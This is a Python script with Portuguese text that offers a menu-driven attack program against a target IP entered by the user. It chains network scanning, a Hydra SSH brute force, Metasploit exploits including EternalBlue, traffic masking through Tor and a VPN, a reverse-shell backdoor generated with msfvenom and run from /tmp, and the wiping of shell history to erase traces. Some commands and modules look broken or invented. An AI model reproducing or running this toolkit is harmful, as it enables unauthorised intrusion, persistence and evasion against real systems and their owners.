import os
import time
import random
import subprocess

# Função para verificar e instalar ferramentas
def install_tool(tool_name, install_command):
    print(f"Verificando instalação de {tool_name}...")
    tool_installed = subprocess.call(f"which {tool_name}", shell=True)
    if tool_installed != 0:
        print(f"{tool_name} não encontrado! Instalando...")
        os.system(install_command)
        time.sleep(2)
    else:
        print(f"{tool_name} já está instalado.")

# Função para obter o IP de destino do usuário
def get_target_ip():
    ip = input("Digite o IP de destino para o ataque: ")
    return ip

# Função para escanear a rede com Masscan e Shodan
def network_scan(target_ip):
    print("Iniciando escaneamento de rede com Masscan e Shodan...")
    os.system(f"masscan {target_ip} -p80,443 --rate=1000")  # Masscan
    time.sleep(random.uniform(2, 5))  # Espera aleatória
    os.system(f"shodan search 'camera port:80'")  # Shodan
    time.sleep(random.uniform(3, 6))  # Espera aleatória

# Função para realizar ataque de força bruta com Hydra
def brute_force_attack(target_ip):
    print("Iniciando ataque de força bruta...")
    os.system(f"hydra -l admin -P /path/to/wordlist.txt ssh://{target_ip}")  # Hydra
    time.sleep(random.uniform(5, 10))  # Espera aleatória entre tentativas

# Função para explorar vulnerabilidades com Metasploit
def metasploit_exploit(target_ip):
    print("Explorando vulnerabilidades com Metasploit...")
    os.system(f"msfconsole -x 'use exploit/linux/http/camera_vuln; set RHOST {target_ip}; exploit'")  # Exploração Metasploit
    time.sleep(random.uniform(5, 10))

# Função para mascarar tráfego com Tor e VPN
def tor_vpn_routing():
    print("Iniciando Tor e VPN para mascarar tráfego...")
    os.system("tor &")  # Tor
    time.sleep(10)  # Espera para conectar ao Tor
    os.system("vpn --connect yourvpnconfig.ovpn")  # Conecta a uma VPN
    time.sleep(10)

# Função para mascarar acesso SSH
def ssh_masquerade(target_ip):
    print("Configuração de SSH mascarado...")
    os.system(f"ssh -f -N -T -D 8080 user@{target_ip}")  # SSH mascarado com túnel SOCKS
    time.sleep(3)

# Função para esconder atividades no sistema
def hide_activities():
    print("Escondendo atividades com Rootkit...")
    os.system("rootkit hunter")  # Rootkit Hunter
    time.sleep(5)
    os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > /tmp/backdoor.elf")
    os.system("chmod +x /tmp/backdoor.elf")
    os.system("/tmp/backdoor.elf &")
    time.sleep(random.uniform(3, 5))

# Função para movimentação lateral
def lateral_movement(target_ip):
    print("Iniciando movimentação lateral...")
    os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; exploit'")  # SMB exploit
    time.sleep(5)

# Função para escalar privilégios
def privilege_escalation():
    print("Escalando privilégios no sistema alvo...")
    os.system("linux-exploit-suggester --run")  # Linux Exploit Suggester
    time.sleep(5)

# Função para apagar todos os rastros
def remove_traces():
    print("Apagando rastros de atividades...")
    os.system("rm -rf /tmp/*")
    os.system("history -c")  # Limpa o histórico de comandos
    os.system("echo > ~/.bash_history")  # Limpa o histórico do bash
    time.sleep(random.uniform(2, 5))  # Espera aleatória

# Função principal que exibe o menu
def show_menu():
    print("\nMENU DE ATACKS:")
    print("1. Escanear Rede")
    print("2. Realizar Ataque de Força Bruta")
    print("3. Exploração com Metasploit")
    print("4. Mascarar Tráfego com Tor e VPN")
    print("5. Mascarar Acesso SSH")
    print("6. Criar Persistência e Backdoor")
    print("7. Movimentação Lateral e Escalabilidade de Privilégios")
    print("8. Limpar Logs e Apagar Rastro")
    print("9. Sair")

def main():
    print("Bem-vindo ao Programa de Ataque!")
    # Instalar ferramentas essenciais
    install_tool("masscan", "sudo apt-get install masscan -y")
    install_tool("shodan", "pip install shodan")
    install_tool("hydra", "sudo apt-get install hydra -y")
    install_tool("metasploit-framework", "sudo apt-get install metasploit-framework -y")
    install_tool("tor", "sudo apt-get install tor -y")
    install_tool("vpn", "sudo apt-get install openvpn -y")
    install_tool("rootkit-hunter", "sudo apt-get install rkhunter -y")
    install_tool("linux-exploit-suggester", "sudo apt-get install linux-exploit-suggester -y")

    # Obter o IP de destino
    target_ip = get_target_ip()

    # Loop do menu
    while True:
        show_menu()
        choice = input("\nEscolha uma opção: ")

        if choice == '1':
            network_scan(target_ip)
        elif choice == '2':
            brute_force_attack(target_ip)
        elif choice == '3':
            metasploit_exploit(target_ip)
        elif choice == '4':
            tor_vpn_routing()
        elif choice == '5':
            ssh_masquerade(target_ip)
        elif choice == '6':
            hide_activities()
        elif choice == '7':
            lateral_movement(target_ip)
            privilege_escalation()
        elif choice == '8':
            remove_traces()
        elif choice == '9':
            print("Saindo... Finalizando operação.")
            break
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()
